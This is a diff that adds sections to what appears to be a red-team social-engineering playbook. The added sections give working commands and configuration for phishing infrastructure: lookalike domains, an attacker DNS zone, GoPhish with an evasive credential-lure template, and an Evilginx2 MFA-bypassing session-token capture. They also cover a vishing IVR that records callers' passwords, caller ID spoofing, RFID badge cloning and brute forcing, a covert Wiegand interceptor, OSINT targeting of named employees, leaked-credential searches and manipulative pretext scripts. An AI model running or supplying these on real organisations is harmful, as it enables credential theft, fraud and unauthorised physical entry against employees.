@@ -720,3 +720,686 @@ IT 维修人员:
 9. 注意摄像头和安保人员
 10. 在计划时间窗口内完成操作
 ```
+
+---
+
+## 9. Phishing Infrastructure
+
+### Domain Spoofing and Setup
+
+```bash
+# Register lookalike domains for phishing campaigns
+# Techniques: homoglyph, typosquatting, TLD variation
+
+# Check domain availability for lookalikes
+for domain in "target-cornpany.com" "targett-company.com" "target-company.net" "target-c0mpany.com"; do
+  whois "$domain" 2>/dev/null | grep -q "No match" && echo "[AVAILABLE] $domain"
+done
+
+# Set up DNS records for phishing domain
+# A record -> attacker server IP
+# MX record -> attacker mail server
+# SPF record to pass email checks
+cat << 'EOF'
+; DNS Zone file for spoofed-domain.com
+@       IN  A       203.0.113.50
+@       IN  MX  10  mail.spoofed-domain.com
+mail    IN  A       203.0.113.50
+@       IN  TXT     "v=spf1 ip4:203.0.113.50 -all"
+default._domainkey IN TXT "v=DKIM1; k=rsa; p=MIGfMA0GCSqGSIb3..."
+_dmarc  IN  TXT     "v=DMARC1; p=none"
+EOF
+```
+
+### GoPhish Advanced Configuration
+
+```bash
+# Full GoPhish deployment with HTTPS and tracking
+# Step 1: Generate SSL certificate (Let's Encrypt)
+certbot certonly --standalone -d phish.spoofed-domain.com
+
+# Step 2: Configure GoPhish with SSL
+cat > config.json << 'EOF'
+{
+  "admin_server": {
+    "listen_url": "0.0.0.0:3333",
+    "use_tls": true,
+    "cert_path": "/etc/letsencrypt/live/phish.spoofed-domain.com/fullchain.pem",
+    "key_path": "/etc/letsencrypt/live/phish.spoofed-domain.com/privkey.pem"
+  },
+  "phish_server": {
+    "listen_url": "0.0.0.0:443",
+    "use_tls": true,
+    "cert_path": "/etc/letsencrypt/live/phish.spoofed-domain.com/fullchain.pem",
+    "key_path": "/etc/letsencrypt/live/phish.spoofed-domain.com/privkey.pem"
+  }
+}
+EOF
+
+# Step 3: Import targets from CSV
+curl -X POST https://localhost:3333/api/groups/ \
+  -H "Authorization: ${GOPHISH_API_KEY}" \
+  -H "Content-Type: application/json" \
+  -d "{\"name\":\"Target-Dept\",\"targets\":$(python3 -c "
+import csv, json
+targets = []
+with open('targets.csv') as f:
+    for row in csv.DictReader(f):
+        targets.append({'email': row['email'], 'first_name': row['first'], 'last_name': row['last'], 'position': row['title']})
+print(json.dumps(targets))
+")}"
+```
+
+### Email Template with Evasion Techniques
+
+```bash
+# Create phishing email that bypasses common filters
+cat > phishing_template.html << 'EOF'
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"></head>
+<body style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
+  <!-- Zero-width characters to break signature detection -->
+  <p>Dear {{.FirstName}},</p>
+  <p>Your account security review is pending. Our system detected
+  unusual sign-in activity from a new device.</p>
+  <p><strong>Action Required:</strong> Please verify your identity within 24 hours
+  to avoid account suspension.</p>
+  <!-- Use legitimate-looking URL with redirect -->
+  <p><a href="{{.URL}}" style="background:#0078d4;color:white;padding:12px 24px;text-decoration:none;border-radius:4px;">
+  Verify My Identity</a></p>
+  <p style="color:#666;font-size:12px;">
+  This is an automated message from IT Security.<br>
+  Reference: SEC-{{.RId}}<br>
+  &copy; 2026 {{.BaseURL}}
+  </p>
+  {{.Tracker}}
+</body>
+</html>
+EOF
+
+# Upload template via API
+curl -X POST https://localhost:3333/api/templates/ \
+  -H "Authorization: ${GOPHISH_API_KEY}" \
+  -H "Content-Type: application/json" \
+  -d "{\"name\":\"Security-Review-2026\",\"subject\":\"[Action Required] Account Security Review - Ref: {{.RId}}\",\"html\":\"$(cat phishing_template.html | python3 -c 'import sys,json; print(json.dumps(sys.stdin.read()))')\"}"
+```
+
+### Evilginx2 Reverse Proxy Phishing
+
+```bash
+# Evilginx2 setup for real-time credential and session token capture
+# This bypasses MFA by proxying the real login page
+
+# Install and configure
+evilginx2 -p /opt/evilginx2/phishlets
+
+# Configure phishlet for target
+: phishlets hostname microsoft365 login.spoofed-domain.com
+: phishlets enable microsoft365
+
+# Create lure URL
+: lures create microsoft365
+: lures edit 0 redirect_url https://office.com
+: lures get-url 0
+
+# Monitor captured sessions
+: sessions
+: sessions 1  # View captured tokens and cookies
+```
+
+---
+
+## 10. Vishing Automation
+
+### Automated Call Script with IVR
+
+```bash
+# Asterisk dialplan for automated vishing campaign
+cat > /etc/asterisk/extensions_vishing.conf << 'EOF'
+[vishing-campaign]
+exten => s,1,Answer()
+same => n,Wait(1)
+same => n,Playback(custom/security-alert)
+same => n,Background(custom/enter-employee-id)
+same => n,Read(EMPID,,6,,,10)
+same => n,Background(custom/enter-password)
+same => n,Read(PASSWORD,,20,,,30)
+same => n,System(echo "${CALLERID(num)}|${EMPID}|${PASSWORD}|$(date)" >> /var/log/vishing/captures.log)
+same => n,Playback(custom/thank-you-secured)
+same => n,Hangup()
+EOF
+
+# Generate audio prompts with text-to-speech
+espeak-ng -w /var/lib/asterisk/sounds/custom/security-alert.wav \
+  "This is an automated security notification from your IT department. We have detected unauthorized access to your corporate account."
+espeak-ng -w /var/lib/asterisk/sounds/custom/enter-employee-id.wav \
+  "Please enter your six digit employee ID followed by the pound sign."
+```
+
+### Caller ID Spoofing Setup
+
+```bash
+# SIP trunk configuration for caller ID manipulation
+cat > /etc/asterisk/sip_spoof.conf << 'EOF'
+[spoof-trunk]
+type=peer
+host=sip-provider.com
+username=account_id
+secret=account_password
+fromuser=+15551234567
+callerid="IT Security" <+15551234567>
+insecure=invite,port
+dtmfmode=rfc2833
+EOF
+
+# Initiate spoofed call via Asterisk AMI
+cat << 'EOF' | nc localhost 5038
+Action: Login
+Username: admin
+Secret: ami_password
+
+Action: Originate
+Channel: SIP/spoof-trunk/+1${TARGET_NUMBER}
+CallerID: "Corporate IT" <${SPOOFED_NUMBER}>
+Context: vishing-campaign
+Extension: s
+Priority: 1
+Async: yes
+
+Action: Logoff
+EOF
+```
+
+### Vishing Campaign Tracking
+
+```python
+#!/usr/bin/env python3
+"""Track vishing campaign results and generate reports."""
+import csv
+import json
+from datetime import datetime
+from pathlib import Path
+
+CAPTURE_LOG = "/var/log/vishing/captures.log"
+TARGETS_FILE = "vishing_targets.csv"
+
+def parse_captures():
+    captures = []
+    if Path(CAPTURE_LOG).exists():
+        with open(CAPTURE_LOG) as f:
+            for line in f:
+                parts = line.strip().split("|")
+                if len(parts) >= 4:
+                    captures.append({
+                        "phone": parts[0],
+                        "employee_id": parts[1],
+                        "credential": parts[2],
+                        "timestamp": parts[3]
+                    })
+    return captures
+
+def generate_report():
+    captures = parse_captures()
+    total_targets = sum(1 for _ in open(TARGETS_FILE)) - 1
+    report = {
+        "campaign": "Vishing Assessment Q2-2026",
+        "total_targets": total_targets,
+        "total_captures": len(captures),
+        "success_rate": f"{len(captures)/total_targets*100:.1f}%",
+        "captures": captures
+    }
+    print(json.dumps(report, indent=2))
+
+if __name__ == "__main__":
+    generate_report()
+```
+
+### IVR System Exploitation
+
+```bash
+# Enumerate IVR menu options via DTMF brute force
+python3 -c "
+import itertools
+# Generate all 1-3 digit DTMF sequences
+sequences = []
+for length in range(1, 4):
+    for combo in itertools.product('0123456789*#', repeat=length):
+        sequences.append(''.join(combo))
+
+# Output as Asterisk call file for automated testing
+for i, seq in enumerate(sequences[:100]):
+    print(f'''Channel: SIP/trunk/{target_number}
+CallerID: \"Test\" <5551234567>
+MaxRetries: 0
+WaitTime: 30
+Context: ivr-test
+Extension: s
+Priority: 1
+Set: DTMF_SEQUENCE={seq}
+''')
+" > /var/spool/asterisk/outgoing/ivr_test.call
+
+# Monitor IVR responses for hidden menus
+# Common hidden codes: 0000, 9999, *#, ##, 1234
+for code in "0000" "9999" "1234" "*#" "##" "0#" "**"; do
+  echo "Testing IVR code: $code"
+done
+```
+
+---
+
+## 11. Physical Security Testing
+
+### Badge Cloning with Proxmark3
+
+```bash
+# Read HID Prox card (125kHz low-frequency)
+proxmark3> lf hid read
+# Output: HID Prox TAG ID: 2004263f88
+
+# Clone to T5577 writable card
+proxmark3> lf hid clone --r 2004263f88
+
+# Read iCLASS card (13.56MHz high-frequency)
+proxmark3> hf iclass reader
+proxmark3> hf iclass dump --ki 0
+
+# Read MIFARE Classic
+proxmark3> hf mf autopwn
+# Dumps all sectors and keys
+
+# Simulate a card (no physical clone needed)
+proxmark3> lf hid sim --r 2004263f88
+
+# Brute force facility codes (if card format is known)
+for fc in $(seq 1 255); do
+  for cn in $(seq 1 65535); do
+    proxmark3> lf hid sim --r $(python3 -c "print(hex(($fc << 16) | $cn))")
+  done
+done
+```
+
+### Lock Picking and Bypass Tools
+
+```bash
+# Physical security assessment toolkit checklist
+cat << 'EOF'
+Lock Bypass Equipment:
+1. Lock pick set (standard pin tumbler)
+   - Short hook, medium hook, diamond, rake (bogota, snake)
+   - Tension wrenches (top-of-keyway, bottom-of-keyway)
+2. Bypass tools
+   - Under-door tool (UDT) for lever handles
+   - Latch slipping shims (credit card technique)
+   - Bump keys (for pin tumbler locks)
+   - Tubular lock picks (for vending machines, elevators)
+3. Electronic bypass
+   - Electromagnetic lock bypass (REX sensor trigger)
+   - Relay attack equipment (for vehicle entry)
+4. Covert entry tools
+   - Traveler hook (for double-sided deadbolts)
+   - Comb picks (for wafer locks)
+   - Decoder picks (for combination locks)
+
+Testing Procedure:
+1. Document lock type and brand
+2. Photograph all entry points
+3. Attempt non-destructive entry
+4. Time each attempt (report average)
+5. Document success/failure for each method
+6. Photograph evidence of entry
+EOF
+```
+
+### Tailgating Detection Assessment
+
+```bash
+# Script to document physical access test results
+cat > /tmp/physical_access_log.sh << 'SCRIPT'
+#!/bin/bash
+# Physical Access Testing Logger
+LOG_FILE="physical_access_$(date +%Y%m%d).csv"
+
+if [ ! -f "$LOG_FILE" ]; then
+  echo "timestamp,location,method,success,notes,evidence_photo" > "$LOG_FILE"
+fi
+
+echo "=== Physical Access Test Entry ==="
+read -p "Location (e.g., main-entrance, server-room): " location
+read -p "Method (tailgate/badge-clone/social/bypass): " method
+read -p "Success (yes/no): " success
+read -p "Notes: " notes
+read -p "Evidence photo filename: " photo
+
+echo "$(date +%Y-%m-%dT%H:%M:%S),$location,$method,$success,$notes,$photo" >> "$LOG_FILE"
+echo "[+] Entry logged to $LOG_FILE"
+SCRIPT
+chmod +x /tmp/physical_access_log.sh
+```
+
+### Wireless Badge Reader Exploitation
+
+```bash
+# Long-range RFID reader for covert badge capture
+# Using HackRF or dedicated long-range reader
+
+# Monitor for badge reads at distance (Proxmark3 with extended antenna)
+proxmark3> lf search
+proxmark3> lf hid watch
+# Wait near target entrance, capture badge data as employees pass
+
+# ESPKey - covert Wiegand interceptor
+# Install between badge reader and access controller
+# Captures all badge swipes over WiFi
+cat << 'EOF'
+ESPKey Configuration:
+1. Open ESPKey WiFi AP (default: ESPKey_XXXX)
+2. Configure: http://192.168.4.1
+3. Set WiFi client mode to exfiltrate data
+4. Install inline on Wiegand D0/D1 lines
+5. Monitor captures via web interface
+6. Export: curl http://espkey-ip/log.csv
+EOF
+```
+
+---
+
+## 12. Social Media OSINT for SE
+
+### Profile Building Automation
+
+```bash
+# Comprehensive target profiling from social media
+# LinkedIn scraping (use authorized tools only)
+python3 -c "
+import json
+
+# Build target profile from multiple sources
+profile = {
+    'target': 'John Smith',
+    'company': 'Target Corp',
+    'sources': {
+        'linkedin': {
+            'title': 'Senior IT Administrator',
+            'tenure': '3 years',
+            'skills': ['Active Directory', 'Azure', 'PowerShell'],
+            'connections': 500,
+            'groups': ['IT Security Professionals', 'Azure Admins']
+        },
+        'github': {
+            'username': 'jsmith-target',
+            'repos': ['internal-scripts', 'homelab-configs'],
+            'languages': ['Python', 'PowerShell', 'Bash']
+        },
+        'twitter': {
+            'handle': '@jsmith_it',
+            'interests': ['cybersecurity', 'homelab', 'gaming'],
+            'recent_posts': ['Excited about new Azure deployment']
+        }
+    },
+    'attack_vectors': [
+        'Phishing: Azure admin notification',
+        'Pretext: IT vendor support call',
+        'Baiting: PowerShell cheat sheet USB'
+    ]
+}
+print(json.dumps(profile, indent=2))
+"
+```
+
+### Relationship Mapping with Maltego
+
+```bash
+# Maltego transform chain for organizational mapping
+# Export results to structured format for SE campaign planning
+
+# Step 1: Domain to employees
+maltego-cli transform "Domain to Email" -i "target-company.com" -o employees.csv
+
+# Step 2: Cross-reference with LinkedIn (manual or API)
+# Build org chart from public data
+python3 -c "
+import json
+
+org_chart = {
+    'ceo': {'name': 'CEO Name', 'email': 'ceo@target.com', 'reports': ['cto', 'cfo', 'coo']},
+    'cto': {'name': 'CTO Name', 'email': 'cto@target.com', 'reports': ['it_director']},
+    'it_director': {'name': 'IT Dir', 'email': 'itdir@target.com', 'reports': ['sysadmin1', 'sysadmin2']},
+    'sysadmin1': {'name': 'John Smith', 'email': 'jsmith@target.com', 'reports': []}
+}
+
+# Identify best SE targets (people with access but lower security awareness)
+for role, info in org_chart.items():
+    if 'admin' in role or 'director' in role:
+        print(f\"[HIGH VALUE] {info['name']} ({role}) - {info['email']}\")
+print(json.dumps(org_chart, indent=2))
+"
+```
+
+### Credential Exposure Search
+
+```bash
+# Search for leaked credentials associated with target organization
+# Check Have I Been Pwned API (authorized use only)
+curl -s -H "hibp-api-key: ${HIBP_API_KEY}" \
+  "https://haveibeenpwned.com/api/v3/breachedaccount/target@target-company.com" | jq '.[].Name'
+
+# Search paste sites for exposed credentials
+# dehashed.com API query
+curl -s "https://api.dehashed.com/search?query=domain:target-company.com" \
+  -H "Accept: application/json" \
+  -u "${DEHASHED_EMAIL}:${DEHASHED_API_KEY}" | jq '.entries[] | {email, password, database_name}'
+
+# GitHub dork for credential exposure
+gh search code "target-company.com password" --limit 20
+gh search code "target-company.com api_key" --limit 20
+gh search code "target-company.com secret" --limit 20
+```
+
+### Social Media Activity Pattern Analysis
+
+```bash
+# Analyze posting patterns to determine work schedule and habits
+python3 -c "
+from collections import Counter
+import json
+
+# Simulated tweet timestamps (replace with actual data collection)
+post_times = [
+    '08:30', '09:15', '12:05', '12:30', '17:45', '18:00',
+    '08:45', '09:00', '12:15', '17:30', '22:00', '22:30'
+]
+
+hours = Counter(t.split(':')[0] for t in post_times)
+print('Activity Pattern:')
+for hour in sorted(hours.keys()):
+    bar = '#' * hours[hour]
+    print(f'  {hour}:00 | {bar} ({hours[hour]})')
+
+print()
+print('Insights:')
+print('- Active mornings 08-09: likely starts work early')
+print('- Lunch break posts 12:00-12:30: predictable break time')
+print('- Evening activity 17-18: leaves work around 5pm')
+print('- Late night 22:00: personal device usage')
+print()
+print('Best phishing send time: 08:00-09:00 (mimics morning notifications)')
+print('Best vishing time: 12:00-12:30 (guard down during break)')
+"
+```
+
+---
+
+## 13. Pretexting Frameworks
+
+### Authority-Based Pretext Templates
+
+```bash
+# Generate pretexting scenarios based on authority exploitation
+cat << 'EOF'
+=== PRETEXT SCENARIO: IT SECURITY AUDIT ===
+
+Role: External IT Security Auditor
+Authority: Hired by CISO (name-drop if known)
+Objective: Obtain credentials or physical access
+
+Script:
+"Hi, I'm [Name] from [Fake Security Firm]. We've been engaged by
+[CISO Name] to conduct the annual security assessment. I need to
+verify your workstation compliance. Could you log into [URL] so I
+can check your security settings?"
+
+Props needed:
+- Business card (fake security firm)
+- Clipboard with "audit checklist"
+- Laptop with official-looking scanning tool
+- Badge with company logo
+
+Escalation path:
+1. If challenged: "You can verify with [CISO Name]'s office"
+2. If still challenged: "I understand, let me have them call you"
+3. Abort trigger: Security team called, actual verification attempted
+
+=== PRETEXT SCENARIO: VENDOR SUPPORT ===
+
+Role: Software Vendor Technical Support
+Authority: Existing vendor relationship
+Objective: Remote access to target systems
+
+Script:
+"This is [Name] from [Known Vendor] support. We've detected a
+critical vulnerability in your [Product] installation that requires
+an emergency patch. I need remote access to apply the fix before
+the exploit goes public tomorrow."
+
+Props needed:
+- Spoofed caller ID matching vendor
+- Knowledge of target's software stack
+- Fake CVE reference number
+- Urgency and time pressure
+EOF
+```
+
+### Scenario-Based Pretext Generator
+
+```python
+#!/usr/bin/env python3
+"""Generate customized pretexting scenarios based on target profile."""
+import json
+import random
+
+SCENARIOS = {
+    "it_support": {
+        "role": "IT Help Desk",
+        "pretexts": [
+            "Password expiry notification requiring immediate reset",
+            "Mandatory security update requiring remote access",
+            "Account compromise alert requiring credential verification",
+            "VPN certificate renewal requiring re-enrollment"
+        ],
+        "urgency": "high",
+        "authority": "IT Department"
+    },
+    "hr_benefits": {
+        "role": "HR Benefits Coordinator",
+        "pretexts": [
+            "Annual benefits enrollment deadline approaching",
+            "Tax form W-2 verification required",
+            "Bonus/raise notification requiring portal login",
+            "Emergency contact update for compliance"
+        ],
+        "urgency": "medium",
+        "authority": "Human Resources"
+    },
+    "executive": {
+        "role": "Executive Assistant",
+        "pretexts": [
+            "CEO needs urgent document review",
+            "Board meeting materials require immediate access",
+            "Confidential merger document for review",
+            "Wire transfer approval needed urgently"
+        ],
+        "urgency": "critical",
+        "authority": "C-Suite"
+    }
+}
+
+def generate_pretext(target_role, target_name):
+    scenario = random.choice(list(SCENARIOS.values()))
+    pretext = random.choice(scenario["pretexts"])
+    return {
+        "target": target_name,
+        "target_role": target_role,
+        "attacker_role": scenario["role"],
+        "pretext": pretext,
+        "urgency": scenario["urgency"],
+        "authority_source": scenario["authority"],
+        "recommended_channel": "email" if scenario["urgency"] == "medium" else "phone"
+    }
+
+if __name__ == "__main__":
+    result = generate_pretext("System Administrator", "John Smith")
+    print(json.dumps(result, indent=2))
+```
+
+### Urgency and Scarcity Exploitation
+
+```bash
+# Templates leveraging psychological pressure tactics
+cat << 'EOF'
+=== URGENCY TRIGGERS ===
+
+Time Pressure:
+- "This must be completed within the next 30 minutes"
+- "The system will be locked in 2 hours if not resolved"
+- "The deadline was yesterday, we need this NOW"
+
+Scarcity:
+- "Only 3 spots remaining for the security training"
+- "This offer expires at end of business today"
+- "Limited access window before the maintenance begins"
+
+Authority + Urgency:
+- "The CEO is waiting for this in the board meeting RIGHT NOW"
+- "Legal has mandated this be completed before close of business"
+- "The auditors arrive tomorrow and this must be resolved today"
+
+Fear:
+- "Your account has been compromised and will be disabled"
+- "Suspicious activity detected - immediate verification required"
+- "Compliance violation detected - respond within 1 hour"
+
+Social Proof:
+- "Everyone in your department has already completed this"
+- "Your manager has already approved and is waiting for your part"
+- "The rest of the team finished yesterday"
+EOF
+```
+
+### Pretext Validation Checklist
+
+```bash
+# Validate pretext before execution
+cat << 'EOF'
+PRETEXT VALIDATION CHECKLIST:
+
+[ ] Backstory is internally consistent
+[ ] Role matches known vendor/department relationships
+[ ] Technical details are accurate for target environment
+[ ] Timing aligns with target's business calendar
+[ ] Authority figure referenced is real and verifiable
+[ ] Fallback story prepared if challenged
+[ ] Communication channel matches pretext (email vs phone vs in-person)
+[ ] Props and supporting materials prepared
+[ ] Abort criteria defined
+[ ] Legal authorization documented and accessible
+
+RED FLAGS TO AVOID:
+- Asking for information the pretexted role would already have
+- Using terminology inconsistent with the role
+- Inability to answer basic questions about the pretexted organization
+- Excessive urgency that seems unrealistic
+- Requesting actions outside normal business processes
+EOF
+```
